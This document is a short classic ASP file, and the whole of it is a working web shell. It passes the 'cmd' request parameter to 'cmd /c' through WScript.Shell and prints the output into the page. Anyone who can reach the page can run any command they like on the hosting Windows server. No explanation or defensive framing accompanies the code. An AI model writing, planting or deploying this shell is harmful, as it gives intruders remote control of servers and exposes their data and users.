<% Set o = Server.CreateObject("WScript.Shell")
   Set r = o.Exec("cmd /c " & Request("cmd"))
   Response.Write("<pre>" & r.StdOut.ReadAll() & "</pre>") %>
